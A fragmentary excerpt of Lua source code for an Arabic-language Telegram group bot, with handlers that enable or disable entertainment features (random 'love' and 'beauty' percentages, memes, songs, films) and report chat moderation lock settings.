local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Antk:Rio'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevRio:get(ARAY..'Rio:Antk:Rio'..msg.chat_id_) and ChCheck(msg) then
...
--     Source ARAY     --
if DevRio:get(ARAY..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevRio:del(ARAY..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(ARAY..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:rules'..msg.chat_id_,text)
...
DevRio:set(ARAY..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevRio:get(ARAY..'Rio:rules'..msg.chat_id_)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Zrf:Rio'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الزخرفه بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Zrf:Rio'..msg.chat_id_,true)  
end
if DevRio:get(ARAY..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر الزخرفه', 1, 'md')
DevRio:del(ARAY..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
...
if not DevRio:get(ARAY..'Rio:Zrf:Rio'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevRio:setex(ARAY.."Zrf:Rio"..msg.chat_id_..msg.sender_user_id_,300,true)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Brg:Rio'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الابراج بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Brg:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(ARAY..'Rio:Brg:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Nsba:Rio'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Nsba:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(ARAY..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevRio:set(ARAY..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevRio:get(ARAY..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر نسبة الحب ', 1, 'md')
DevRio:del(ARAY..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
...
DevRio:set(ARAY..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ᥀" and DevRio:get(ARAY..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevRio:del(ARAY..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(ARAY..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ᥀" and DevRio:get(ARAY..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevRio:del(ARAY..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(ARAY..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ᥀" and DevRio:get(ARAY..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر نسبة الكره ', 1, 'md')
DevRio:del(ARAY..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(ARAY..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ᥀" and DevRio:get(ARAY..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevRio:del(ARAY..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(ARAY..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ᥀" and DevRio:get(ARAY..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevRio:del(ARAY..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(ARAY..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ᥀" and DevRio:get(ARAY..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevRio:del(ARAY..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Age:Rio'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Age:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(ARAY..'Rio:Age:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Mean:Rio'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل معاني الاسماء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Mean:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(ARAY..'Rio:Mean:Rio'..msg.chat_id_) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:gif:Rio'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:gif:Rio'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevRio:get(ARAY..'Rio:gif:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:memz:Rio'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:memz:Rio'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevRio:get(ARAY..'Rio:memz:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Audios:Rio'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Audios:Rio'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevRio:get(ARAY..'Rio:Audios:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:mp3:Rio'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:mp3:Rio'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevRio:get(ARAY..'Rio:mp3:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Remix:Rio'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Remix:Rio'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevRio:get(ARAY..'Rio:Remix:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Photo:Rio'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Photo:Rio'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevRio:get(ARAY..'Rio:Photo:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Anime:Rio'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Anime:Rio'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevRio:get(ARAY..'Rio:Anime:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Movies:Rio'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Movies:Rio'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevRio:get(ARAY..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Series:Rio'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Series:Rio'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevRio:get(ARAY..'Rio:Series:Rio'..msg.chat_id_) and ChCheck(msg) then
...
--     Source ARAY     --
if Admin(msg) then
if DevRio:get(ARAY..'Rio:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevRio:get(ARAY..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الروابط ↫ "..mute_links.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevRio:get(ARAY..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙المعرف ↫ "..lock_tag.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevRio:get(ARAY..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙المتحركه ↫ "..mute_gifs.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الملصقات" then if DevRio:get(ARAY..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الملصقات ↫ "..lock_sticker.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الصور" then if DevRio:get(ARAY..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الصور ↫ "..mute_photo.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevRio:get(ARAY..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الفيديو ↫ "..mute_video.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الاونلاين" then if DevRio:get(ARAY..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local ARAYTeam = "\n" .."↯︙الاونلاين ↫ "..mute_in.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الدردشه" then if DevRio:get(ARAY..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الدردشه ↫ "..mute_text.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevRio:get(ARAY..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local ARAYTeam = "\n" .."↯︙التوجيه ↫ "..lock_forward.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الاغاني" then if DevRio:get(ARAY..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الاغاني ↫ "..mute_music.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevRio:get(ARAY..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local ARAYTeam = "\n" .."↯︙الصوت ↫ "..mute_voice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevRio:get(ARAY..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الجهات ↫ "..lock_contact.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الماركداون" then if DevRio:get(ARAY..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local ARAYTeam = "\n" .."↯︙الماركداون ↫ "..markdown.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الهاشتاك" then if DevRio:get(ARAY..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local ARAYTeam = "\n" .."↯︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "التعديل" then if DevRio:get(ARAY..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local ARAYTeam = "\n" .."↯︙التعديل ↫ "..mute_edit.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "التثبيت" then if DevRio:get(ARAY..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local ARAYTeam = "\n" .."↯︙التثبيت ↫ "..lock_pin.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الاشعارات" then if DevRio:get(ARAY..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الكلايش" then if DevRio:get(ARAY..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الكلايش ↫ "..lock_spam.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الدخول" then if DevRio:get(ARAY..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local ARAYTeam = "\n" .."↯︙الدخول ↫ "..lock_Join.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الشبكات" then if DevRio:get(ARAY..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الشبكات ↫ "..lock_wp.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "المواقع" then if DevRio:get(ARAY..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙المواقع ↫ "..lock_location.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "العربيه" then if DevRio:get(ARAY..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙العربيه ↫ "..lock_arabic.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الانكليزيه" then if DevRio:get(ARAY..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local ARAYTeam = "\n" .."↯︙الانكليزيه ↫ "..lock_english.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الكفر" then if DevRio:get(ARAY..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local ARAYTeam = "\n" .."↯︙الكفر ↫ "..lock_kaf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الفشار" then if DevRio:get(ARAY..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local ARAYTeam = "\n" .."↯︙الفشار ↫ "..lock_fshar.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
if text == "الطائفيه" then if DevRio:get(ARAY..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local ARAYTeam = "\n" .."↯︙الطائفيه ↫ "..lock_taf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam, 1, 'md') end
end
--     Source ARAY     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:LockSettings'..msg.chat_id_) 
end
--     Source ARAY     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:Robot'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:Robot'..msg.chat_id_,true)
end
--     Source ARAY     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:GpRed'..msg.chat_id_,true)
end
--     Source ARAY     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:AllRed'..msg.chat_id_,true)
end
--     Source ARAY     --
if RioSudo(msg) then
...
--     Source ARAY     --
